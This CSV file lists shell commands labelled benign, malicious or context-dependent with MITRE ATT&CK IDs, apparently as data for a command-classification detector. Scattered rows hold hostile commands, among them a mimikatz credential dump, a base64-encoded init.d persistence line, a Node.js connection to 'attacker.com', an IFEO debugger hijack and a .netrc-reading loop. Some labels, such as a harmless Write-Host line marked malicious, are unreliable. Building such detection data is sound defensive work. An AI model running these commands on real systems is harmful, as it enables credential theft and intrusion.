command,label,original_label,mitre_id
find . -name RAID -prune -o -print,Benign,Benign,Benign
C:\User\1\,Malicious,Malicious,T1074
pacaur -Syua,Benign,Benign,Benign
nxc ldap 192.168.178.2 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt,Benign,Benign,Benign
rustscan [-g|--greppable] [-a|--addresses] address_or_addresses,Benign,Benign,Benign
rspec --init,Benign,Benign,Benign
brittany path/to/file.hs,Benign,Benign,Benign
IOCTL_DISK_GET_DRIVE_GEOMETRY,Malicious,Malicious,T1680
enum4linux -a 10.0.0.5,Context_Dependent,Synthetic,Synthetic
echo $(( $(... | paste -sd+ -) )),Benign,Benign,Benign
"espeak-ng -w path/to/output.wav ""text""",Benign,Benign,Benign
pio platform update,Benign,Benign,Benign
fclones group --cache path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
pw-dump [-m|--monitor],Benign,Benign,Benign
find /dev/sd*[a-z] | wc -l,Benign,Benign,Benign
kubectl expose [-f|--filename] path/to/file.yml --port node_port --target-port container_port,Benign,Benign,Benign
pw-mon [-r|--remote] remote_name,Benign,Benign,Benign
<Ctrl g><v>,Benign,Benign,Benign
cpufreq-info,Benign,Benign,Benign
kubectl label [po|pods] key=value --all,Benign,Benign,Benign
"$env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""",Malicious,Malicious,T1567
in2csv data.xls,Benign,Benign,Benign
cidr contains 10.0.0.0/16 10.0.14.5,Benign,Benign,Benign
go clean -cache,Benign,Benign,Benign
sudo etckeeper unclean,Benign,Benign,Benign
GetFileInfo -m path/to/file,Benign,Benign,Benign
pdfjoin /path/to/file1.pdf 2- file2 last-3 --outfile output_file,Benign,Benign,Benign
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideClock /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
ppmtoxpm [-h|-hexonly] path/to/input_file.ppm > path/to/output_file.xpm,Benign,Benign,Benign
reg.py domain/username:password@target delete -keyName 'HKLM\SOFTWARE\Example' -v value_name,Benign,Benign,Benign
find / ! -newer /tmp/timestamp -exec touch {} \;,Context_Dependent,Benign,Benign
netsh wlan show,Context_Dependent,Malicious,T1016
"sudo tune2fs -o discard,user_xattr /dev/sdXN",Benign,Benign,Benign
command -v wget,Context_Dependent,Synthetic,Synthetic
"find / -name ""*.txt"" -xdev 2> /dev/null",Context_Dependent,Benign,Benign
nmcli [m|monitor],Benign,Benign,Benign
ncftp,Malicious,Malicious,T1059
"""$mimikatz_exe"" ""sekurlsa::minidump $input_file"" ""sekurlsa::logonpasswords full"" exit",Malicious,Malicious,T1003
sudo iftop -n,Benign,Benign,Benign
diffoscope --exclude pattern path/to/directory1 path/to/directory2,Benign,Benign,Benign
service service_name status,Benign,Benign,Benign
kubectl label [-f|--filename] pod_definition_file key=value,Benign,Benign,Benign
docker < path/to/image_file.tar [load|image load],Benign,Benign,Benign
npm profile set password,Benign,Benign,Benign
automount -t 300,Benign,Benign,Benign
pw-cli [h|help],Benign,Benign,Benign
hurl --variables-file path/to/variables_file --secrets-file path/to/secrets_file path/to/file.hurl,Benign,Benign,Benign
az vm create [-g|--resource-group] rg [-n|--name] vm_name --image UbuntuLTS --admin-user azureuser --generate-ssh-keys,Benign,Benign,Benign
molecule matrix converge,Benign,Benign,Benign
"find . -regex "".*/(test)[0-9][0-9]\.txt""",Benign,Benign,Benign
find . -path './kt[0-9] ',Benign,Benign,Benign
tldr invoke-item,Benign,Benign,Benign
alias j7='JAVA_HOME=`/usr/libexec/java_home -v 1.7`',Benign,Benign,Benign
firefox --profile path/to/directory https://example.com/,Benign,Benign,Benign
cloc --diff path/to/directory1 path/to/directory2,Benign,Benign,Benign
gh [cs|codespace] delete,Benign,Benign,Benign
espanso edit config,Benign,Benign,Benign
add jar package.jar;,Benign,Benign,Benign
flutter run -d all,Benign,Benign,Benign
ptx [-G|--traditional] path/to/file,Benign,Benign,Benign
php-coveralls [-v|--verbose],Benign,Benign,Benign
mvn archetype:generate --define archetypeGroupId=group_id --define archetypeArtifactId=artifact_id --define archetypeVersion=version --define groupId=project_group_id --define artifactId=project_name --define interactiveMode=false,Benign,Benign,Benign
dotenvx get --all,Benign,Benign,Benign
find . -name a\*.html,Benign,Benign,Benign
iperf3 [-c|--client] server [-P|--parallel] streams,Benign,Benign,Benign
cs java -version,Benign,Benign,Benign
if ($tcp.Connected) {,Context_Dependent,Malicious,T1046
kubectl auth can-i '*' '*' [-n|--namespace] namespace,Context_Dependent,Benign,Benign
server: https://x,Malicious,Malicious,T1059
pio check,Benign,Benign,Benign
obs --verbose,Benign,Benign,Benign
sui move subcommand,Benign,Benign,Benign
hashid,Benign,Benign,Benign
couchdb -i,Benign,Benign,Benign
{ time find / 2>/dev/null; } 2>time.txt,Benign,Benign,Benign
IVssBackupComponents,Malicious,Malicious,T1490
systemd-tty-ask-password-agent --watch,Benign,Benign,Benign
"find . -iname ""needle""",Benign,Benign,Benign
path=$(basename $(pwd) | awk '{print tolower($0)}'),Benign,Benign,Benign
duckdb -ui,Benign,Benign,Benign
crane registry serve --disk path/to/store_directory,Benign,Benign,Benign
"echo ""python3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \"" "" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
mamba repoquery depends [-t|--tree] scipy,Benign,Benign,Benign
"require(""net"").connect(12345, ""attacker.com"", function () {",Malicious,Malicious,T1059
setserial -a /dev/cuaN,Benign,Benign,Benign
docker system df,Benign,Benign,Benign
find / -name 'Metallica*' -exec ls -l {} \;,Context_Dependent,Benign,Benign
opencode auth [-h|--help],Benign,Benign,Benign
sudo postfix reload,Benign,Benign,Benign
cd .\tmp\victim-files,Malicious,Malicious,T1560
Add-AppxPackage -Path path\to\package.msix -DependencyPath path\to\dependencies.msix -AllowUnsigned,Benign,Benign,Benign
sdiag [-a|--all] [-M|--cluster] cluster_name,Benign,Benign,Benign
gnmic [-a|--address] ip:port [sub|subscribe] --path path --stream-mode on-change --heartbeat-interval 1m,Benign,Benign,Benign
"[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)",Malicious,Malicious,T1566
collectd -C path/to/file,Benign,Benign,Benign
"tac | sed '0,/a/ s/a/c/' | tac",Benign,Benign,Benign
svn log [-vl|--verbose --limit] 10,Benign,Benign,Benign
id3tag --album album *.mp3,Benign,Benign,Benign
bpython --config path/to/file.conf,Benign,Benign,Benign
pg_test_fsync [-s|--secs-per-test] seconds,Benign,Benign,Benign
home-manager switch,Benign,Benign,Benign
ghq get repository_url,Benign,Benign,Benign
qm [cr|create] 100 --hookscript path/to/script.pl,Benign,Benign,Benign
go fmt path/to/package,Benign,Benign,Benign
"find /usr/local/games -name ""*xpilot*""",Benign,Benign,Benign
find -name file -fprint file,Benign,Benign,Benign
"yes ""$OPTARG"" | head -$opt",Benign,Benign,Benign
exec:,Malicious,Malicious,T1059
finger,Context_Dependent,Benign,Benign
read -n1,Benign,Benign,Benign
sudo chown $(whoami):$(whoami) /usr/local/rvm/gems/ruby-2.0.0-p481/ -R,Benign,Benign,Benign
find file -chour +1 -exit 0 -o -exit 1,Benign,Benign,Benign
ssh -L 3306:localhost:3306 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
"find /path/with/files -type f -name ""*txt*"" -exec ln -s {} . ';'",Benign,Benign,Benign
"find -type f -name thumb.png -exec ./deslash.sh {} "";""",Benign,Benign,Benign
doppler projects get name|project_id,Benign,Benign,Benign
nxc vnc 192.168.178.2 [-u|--username] username [-p|--password] password --screenshot --screentime 10,Benign,Benign,Benign
"zenity --forms --add-entry ""name_label"" --add-password ""password_label"" --separator "";""",Benign,Benign,Benign
Get-GPPPassword -Verbose,Malicious,Malicious,T1552
sudo apt upgrade $(debsecan --only-fixed --format packages),Benign,Benign,Benign
find ./ -type f -size 0c -print | xargs rm,Benign,Benign,Benign
radare2 -nw path/to/binary,Benign,Benign,Benign
git blame -L 123 path/to/file,Benign,Benign,Benign
sudo hostapd -B path/to/hostapd.conf,Benign,Benign,Benign
sudo lxc-start container_name,Benign,Benign,Benign
virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/,Malicious,Malicious,T1222
gvmap -c 1|2|3|... graph.gv -o output.xdot,Benign,Benign,Benign
"if ($ipAddr -like ""*,*"") {",Context_Dependent,Malicious,T1046
cd $stratus_path,Malicious,Malicious,T1552
autossh -M monitor_port -L local_port:localhost:remote_port user@host,Context_Dependent,Benign,Benign
pacman -Fl package,Benign,Benign,Benign
hcloud -h,Benign,Benign,Benign
where /R path\to\directory file_pattern,Benign,Benign,Benign
fadvise path/to/file,Benign,Benign,Benign
upower [-m|--monitor],Benign,Benign,Benign
ubuntu-security-status --unavailable,Benign,Benign,Benign
Get-History -Count n,Benign,Benign,Benign
jbang run [-i|--interactive],Benign,Benign,Benign
nmap -sV -p 8443 10.0.0.5,Context_Dependent,Synthetic,Synthetic
flutter doctor,Benign,Benign,Benign
turbo run task_name --graph=path/to/file.html|jpg|json|pdf|png|svg,Benign,Benign,Benign
pamscale [-wid|-width] width path/to/input.pam > path/to/output.pam,Benign,Benign,Benign
stat -x path/to/file,Benign,Benign,Benign
find /home -type f -name *.sxw -atime -3 -user bruno,Context_Dependent,Benign,Benign
lsattr -R,Benign,Benign,Benign
navi --print,Benign,Benign,Benign
ip -4 addr,Context_Dependent,Synthetic,Synthetic
IKEEXT,Malicious,Malicious,T1543
screen -dmS title executable,Benign,Benign,Benign
act,Benign,Benign,Benign
wikiman -h,Benign,Benign,Benign
"gox -osarch=""os/arch""",Benign,Benign,Benign
systemctl bind unit /path/to/host_directory /path/to/unit_directory,Benign,Benign,Benign
chromium --user-data-dir path\to\directory,Benign,Benign,Benign
cli53 [rc|rrcreate] example.com 'www 300 A 150.130.110.1',Benign,Benign,Benign
find / -size +10M -printf “%12s %t %h/%fn”,Context_Dependent,Benign,Benign
pbmreduce [-va|-value] 0.6 n path/to/image.pbm > path/to/output.pbm,Benign,Benign,Benign
pdfdetach -savefile name path/to/input.pdf,Benign,Benign,Benign
popd +N,Benign,Benign,Benign
dysk [-f|--filter] 'use > 65% | free < 50G',Benign,Benign,Benign
mktemp -t identifier.XXXXXXXXXX,Benign,Benign,Benign
bmon [-b|--use-bit],Benign,Benign,Benign
minidlna -f path/to/minidlna.conf,Benign,Benign,Benign
fastboot flash recovery path/to/file.img,Benign,Benign,Benign
html5validator --root path/to/directory,Benign,Benign,Benign
ast-grep scan [-r|--rule] path/to/rule.yml path/to/directory,Benign,Benign,Benign
surge path/to/project,Benign,Benign,Benign
dbclient -i path/to/key_file user@host,Benign,Benign,Benign
tic -xe terminal path/to/terminal.info,Benign,Benign,Benign
sudo netselect-apt [-c|--country] India,Benign,Benign,Benign
nnn -o,Benign,Benign,Benign
ldapsearch,Context_Dependent,Malicious,T1087
.vmx,Malicious,Malicious,T1564
"ls -p | grep -v / | xargs md5sum | awk '{print $2,$1}'",Benign,Benign,Benign
"xcowsay ""hello, world""",Benign,Benign,Benign
sudo tune2fs -o has_journal /dev/sdXN,Benign,Benign,Benign
"fs_cli [-x|--execute] ""show calls""",Benign,Benign,Benign
gh api [-X|--method] POST endpoint,Benign,Benign,Benign
drupal module:uninstall module_name,Benign,Benign,Benign
<mode>0600</mode>,Malicious,Malicious,T1222
jj [b|bookmark] [d|delete] name,Benign,Benign,Benign
sed --in-place '/some string here/d' yourfile,Benign,Benign,Benign
sudo lxc-attach container_name,Benign,Benign,Benign
unzip -O gbk path/to/archive1.zip path/to/archive2.zip ...,Benign,Benign,Benign
path/to/ArkAscendedServer TheIsland_WP -ServerPlatform=PC+XSX+PS5,Benign,Benign,Benign
"Write-Host ""Extraction completed."" -ForegroundColor Green",Malicious,Malicious,T1562
find /home/family/Music -type f -name '*.m4a' -print0,Context_Dependent,Benign,Benign
vagrant destroy [-g|--graceful],Benign,Benign,Benign
"find /home/*/public_html/ -type f -iwholename ""*/wp-includes/version.php"" -exec grep -H ""\$wp_version ="" {} \;",Context_Dependent,Benign,Benign
NtImpersonateThread,Malicious,Malicious,T1134
lpstat -d,Benign,Benign,Benign
lli -O3 path/to/file.ll,Benign,Benign,Benign
ts-node [-T|--transpileOnly] path/to/file.ts,Benign,Benign,Benign
blastp -query query.fa -subject subject.fa -evalue 1e-9,Benign,Benign,Benign
last username,Context_Dependent,Benign,Benign
pdfseparate -l 10 path/to/source_filename.pdf path/to/destination_filename-%d.pdf,Benign,Benign,Benign
file [-b|--brief] path/to/file,Benign,Benign,Benign
"Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""$target_user""",Malicious,Malicious,T1098
colorls [-d|--dirs],Benign,Benign,Benign
sudo dscl . -create /Users/$user_name UniqueID 333,Malicious,Malicious,T1564
gpg [-d|--decrypt] doc.txt.gpg,Benign,Benign,Benign
", or",Malicious,Malicious,T1564
find . -name * -exec ls -a {} \;,Benign,Benign,Benign
find / -size +100M -exec /bin/rm {} \;,Context_Dependent,Benign,Benign
autoexpect command,Benign,Benign,Benign
dnf reposync --repoid repo_name,Benign,Benign,Benign
lesskey [-o|--output] path/to/output path/to/lesskey_file,Benign,Benign,Benign
nemo --geometry=600x400 path/to/directory,Benign,Benign,Benign
broot [-s|--sizes],Benign,Benign,Benign
procstat vm pid,Benign,Benign,Benign
sudo rpmconf [-a|--all] [-c|--clean],Benign,Benign,Benign
glab [co|mr checkout] pr_number,Benign,Benign,Benign
alias iTMSTransporter='`xcode-select --print-path`/../Applications/Application\ Loader.app/Contents/MacOS/itms/bin/iTMSTransporter',Benign,Benign,Benign
find /home -depth -print | cpio -ov -0 /dev/rmt0 | tee -a tape.log,Context_Dependent,Benign,Benign
pio settings get setting,Benign,Benign,Benign
ng [n|new] project_name,Benign,Benign,Benign
kube-capacity [-p|--pods],Benign,Benign,Benign
kubectl get clusterrolebindings,Context_Dependent,Synthetic,Synthetic
Clear-RecycleBin -Force,Benign,Benign,Benign
"cal -h|sed -r ""s/\b$(date|cut -d' ' -f3)\b/*/""",Benign,Benign,Benign
uncrustify --set option=value,Benign,Benign,Benign
sherlock --unique-tor username,Benign,Benign,Benign
chntpw -i path/to/sam_file,Benign,Benign,Benign
Force = $true,Malicious,Malicious,T1114
Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0,Context_Dependent,Malicious,T1016
lrzip path/to/file,Benign,Benign,Benign
vim-cmd hostsvc/enable_ssh,Malicious,Malicious,T1021
opencode uninstall [-d|--keep-data],Benign,Benign,Benign
trizen -Qe,Benign,Benign,Benign
paccapability --version,Benign,Benign,Benign
"seq 1 10 | perl -ne 'push @l, $_; print shift @l if @l > 3'",Benign,Benign,Benign
gst-launch-1.0 source ! videoconvert ! sink,Benign,Benign,Benign
doxygen -g,Benign,Benign,Benign
flake8 path/to/file_or_directory,Benign,Benign,Benign
systemd-dissect --attach path/to/image.raw,Benign,Benign,Benign
list functions;,Benign,Benign,Benign
uv init project_name,Benign,Benign,Benign
feedreader --playMedia=article_url,Benign,Benign,Benign
psgrep -s process_name,Benign,Benign,Benign
smbget --recursive smb://server/share,Benign,Benign,Benign
pdftk path/to/input.pdf cat 1-2 3east 4-end output path/to/output.pdf,Benign,Benign,Benign
gpg [--full-gen-key|--full-generate-key],Benign,Benign,Benign
composer audit --no-dev,Benign,Benign,Benign
toolbox list [-i|--images],Benign,Benign,Benign
az logout,Benign,Benign,Benign
top [-Hp|--threads-show --pid] process_id,Benign,Benign,Benign
laydown clear,Benign,Benign,Benign
nmap --script=default 10.10.10.10,Context_Dependent,Synthetic,Synthetic
gcloud iam service-accounts create $service-account-name,Malicious,Malicious,T1078
mdatopbm path/to/image.mda > path/to/output.pbm,Benign,Benign,Benign
set comspec=$command_to_execute,Malicious,Malicious,T1216
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v Debugger /d ""$payload_binary""",Malicious,Malicious,T1546
javac path/to/file.java,Benign,Benign,Benign
xz -9 path/to/file,Benign,Benign,Benign
stat $target_filename,Malicious,Malicious,T1070
for file in $(find $file_path -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done,Malicious,Malicious,T1552
"find . -name '*song*abc2009*.jpg' | sed 's/\(^.*song.*\)abc2009\(.*.jpg\)$/mv ""&"" ""\1def2010\2""/' | sh",Benign,Benign,Benign
bun run path/to/file|script_name,Benign,Benign,Benign
ls 2>&1 | tee /tmp/ls.txt,Benign,Benign,Benign
spicetify,Benign,Benign,Benign
conda package --pkg-name name,Benign,Benign,Benign
opencode uninstall [-f|--force],Benign,Benign,Benign
checksec kernel,Benign,Benign,Benign
clip-view path/to/page1.clip path/to/page2.clip ...,Benign,Benign,Benign
unix2mac path/to/file,Benign,Benign,Benign
command | sed 's#////#____#g',Benign,Benign,Benign
fossil push remote_url,Benign,Benign,Benign
bun init [-m|--minimal],Benign,Benign,Benign
find -mindepth 3 -type d ! -path '*/p/*' -name c -print,Benign,Benign,Benign
"for i in `find . | grep "".xml$""`; do bzip2 $i&; done",Benign,Benign,Benign
clang [-c|--compile] path/to/source.c,Benign,Benign,Benign
enum4linux -a remote_host,Context_Dependent,Benign,Benign
ppmwheel [-huev|-huevalue] diameter > path/to/output.ppm,Benign,Benign,Benign
~/Library/Keychains/,Malicious,Malicious,T1555
frida [-c|--codeshare] script_name process_name,Benign,Benign,Benign
dvc destroy [-f|--force],Benign,Benign,Benign
spa-resample [-f|--format] s8|s16|s32|f32|f64 path/to/input.wav path/to/output.wav,Benign,Benign,Benign
mailsy me,Benign,Benign,Benign
spectacle,Benign,Benign,Benign
tabula [-o|--outfile] file.csv file.pdf,Benign,Benign,Benign
